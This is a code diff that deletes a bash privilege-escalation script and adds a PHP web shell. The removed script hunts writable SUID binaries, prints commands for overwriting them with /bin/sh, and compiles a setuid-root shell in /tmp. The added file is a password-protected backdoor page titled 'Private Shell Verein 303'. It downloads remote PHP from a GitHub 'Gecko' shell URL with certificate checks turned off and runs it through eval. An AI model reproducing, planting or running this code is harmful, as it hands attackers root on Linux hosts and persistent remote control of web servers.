@@ -1,73 +1,102 @@
-#!/bin/bash
-# suid-writable-hunter.sh - Detect writable SUID binaries for hijacking
-# Proxmox VE / Linux Privesc Tool
+<?php
+session_start();
 
-echo "[+] Hunting writable SUID binaries..."
-echo "=============================================="
+/**
+ * Disable error reporting
+ *
+ * Set this to error_reporting( -1 ) for debugging.
+ */
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
 
-# Find ALL SUID binaries
-SUID_BINS=$(find / \( -perm -4000 -o -perm -6000 \) -type f 2>/dev/null | xargs -r ls -la)
+        // Set cookies using session if available
+        if (isset($_SESSION['SAP'])) {
+            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
+        }
 
-# Check each for writability/abuse potential
-echo "$SUID_BINS" | while read line; do
-    if [[ -n "$line" ]]; then
-        bin_path=$(echo "$line" | awk '{print $NF}')
-        [[ ! -f "$bin_path" ]] && continue
-        
-        # Permissions check
-        perms=$(stat -c "%A %a" "$bin_path" 2>/dev/null)
-        owner=$(stat -c "%U" "$bin_path" 2>/dev/null)
-        size=$(stat -c "%s" "$bin_path" 2>/dev/null)
-        
-        echo "[SUID] $bin_path"
-        echo "  Owner: $owner | Perms: $perms | Size: ${size}B"
-        
-        # WRITABLE checks (CRITICAL)
-        if [[ -w "$bin_path" ]]; then
-            echo "  🔥 WRITABLE SUID! Direct overwrite possible"
-            echo "  Exploit: cp /bin/sh $bin_path; chmod 4755 $bin_path; $bin_path"
-        fi
-        
-        # Parent directory writable
-        parent_dir=$(dirname "$bin_path")
-        if [[ -w "$parent_dir" ]]; then
-            echo "  🔥 PARENT DIR WRITABLE! Can replace binary"
-            echo "  Exploit: cp /bin/sh $bin_path; $bin_path"
-        fi
-        
-        # Small binaries (< 1MB) = good hijack targets
-        if [[ "$size" -lt 1000000 ]]; then
-            echo "  💥 SMALL BINARY! Perfect for shellcode injection"
-        fi
-        
-        # Proxmox/QEMU/LXC specific
-        if [[ "$bin_path" =~ (pve|qemu|lxc|vz) ]]; then
-            echo "  🐳 PROXMOX/CONTAINER BINARY! High value target"
-        fi
-        
-        echo ""
-    fi
-done
-
-echo "[+] Checking /tmp world-writable abuse..."
-if [[ -w /tmp ]]; then
-    echo "  🔥 /tmp writable - drop SUID shell here"
-    cat > /tmp/suid-test.c << 'EOF'
-#include <unistd.h>
-#include <sys/types.h>
-int main() {
-    setuid(0); setgid(0);
-    execve("/bin/sh", NULL, NULL);
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        $url_get_contents_data = false;
+    }
+    return $url_get_contents_data;
 }
-EOF
-    gcc -static -o /tmp/suid-sh /tmp/suid-test.c 2>/dev/null && echo "  💣 /tmp/suid-sh compiled - find SUID target to copy"
-fi
 
-echo "[+] Capabilities abuse check..."
-getcap -r / 2>/dev/null | grep cap_setuid
+// Function to check if the user is logged in
+function is_logged_in()
+{
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
 
-echo "[+] Proxmox specific SUID hunt..."
-find /usr/bin /usr/sbin /var/lib/pve -perm -4000 2>/dev/null 2>&1 | xargs -r ls -la
+// Check if the password is submitted and correct
+if (isset($_POST['password'])) {
+    $entered_password = $_POST['password'];
+    
+    // Daftar hash password yang diizinkan
+    $valid_hashes = [
+        '3a06dfb4c63cb932a3b51e0502ca05b5', // password lama
+        'c88e5214fdfb511722bc19747c39939f'  // password baru yang kamu minta
+    ];
 
-echo "=============================================="
-echo "[+] Copy output to note and share high-value targets!"
+    if (in_array(md5($entered_password), $valid_hashes)) {
+        // Password is correct, store it in session
+        $_SESSION['logged_in'] = true;
+        $_SESSION['SAP'] = 'janco'; // Replace this with your cookie data
+    } else {
+        // Password is incorrect
+        echo "Incorrect password. Please try again.";
+    }
+}
+
+// Check if the user is logged in before executing the content
+if (is_logged_in()) {
+    $a = geturlsinfo('https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php');
+    eval('?>' . $a);
+} else {
+    // Display login form if not logged in
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>HOKI 303</title>
+    </head>
+    <body>
+	
+<center>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<center><header>
+<pre><span style="color: #339966;"> ___________________________
+ &lt; Private Shell Verein 303 &gt;
+ ---------------------------</span>
+ <span style="color: #339966;">⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢻⣿⡗⢶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣄
+⠀⢻⣇⠀⠈⠙⠳⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠶⠛⠋⣹⣿⡿
+⠀⠀⠹⣆⠀⠀⠀⠀⠙⢷⣄⣀⣀⣀⣤⣤⣤⣄⣀⣴⠞⠋⠉⠀⠀⠀⢀⣿⡟⠁
+⠀⠀⠀⠙⢷⡀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀
+⠀⠀⠀⠀⠈⠻⡶⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣠⡾⠋⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣼⠃⠀⢠⠒⣆⠀⠀⠀⠀⠀⠀⢠⢲⣄⠀⠀⠀⢻⣆⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢰⡏⠀⠀⠈⠛⠋⠀⢀⣀⡀⠀⠀⠘⠛⠃⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀
+⠀⠀⠀⠀⣾⡟⠛⢳⠀⠀⠀⠀⠀⣉⣀⠀⠀⠀⠀⣰⢛⠙⣶⠀⢹⣇⠀⠀⠀⠀
+⠀⠀⠀⠀⢿⡗⠛⠋⠀⠀⠀⠀⣾⠋⠀⢱⠀⠀⠀⠘⠲⠗⠋⠀⠈⣿⠀⠀⠀⠀
+⠀⠀⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠈⠓⠒⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠀⠀
+⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀
+⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁  </span></pre>
+</header><form action="" method="POST"><label for="password"><span style="color: #ffffff;">Password :</span>:</label> <input id="password" name="password" type="password" /> <input type="submit" value="Login" /></form></center>
+        <body style="background-color:black;">
+    </html>
+    <?php
+}
+?>
